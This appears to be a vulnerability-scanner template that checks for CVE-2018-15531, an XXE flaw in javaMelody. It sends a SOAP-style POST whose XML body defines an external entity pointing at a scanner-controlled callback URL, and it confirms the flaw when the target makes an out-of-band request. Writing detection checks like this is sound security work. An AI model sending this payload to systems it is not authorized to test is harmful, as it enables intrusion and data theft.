id: CVE-2018-15531

info:
  name: javaMelody XXE
  author: Lay0us1
  severity: high
  reference:
    - https://imagemlt.github.io/post/melodyXXE/index.html

set:
  reverse: newReverse()
  reverseURL: reverse.url
rules:
  r0:
    request:
      method: POST
      path: /
      headers:
        Content-Type: text/xml
        SOAPAction: aaaaa
        Content-Length: 154
      body: |
        <?xml version="1.0" encoding="UTF-8" standalone="no" ?>
        <!DOCTYPE root [
        <!ENTITY % remote SYSTEM "{{reverseURL}}">
        %remote;
        ]>
        </root>
    expression: reverse.wait(5)
expression: r0()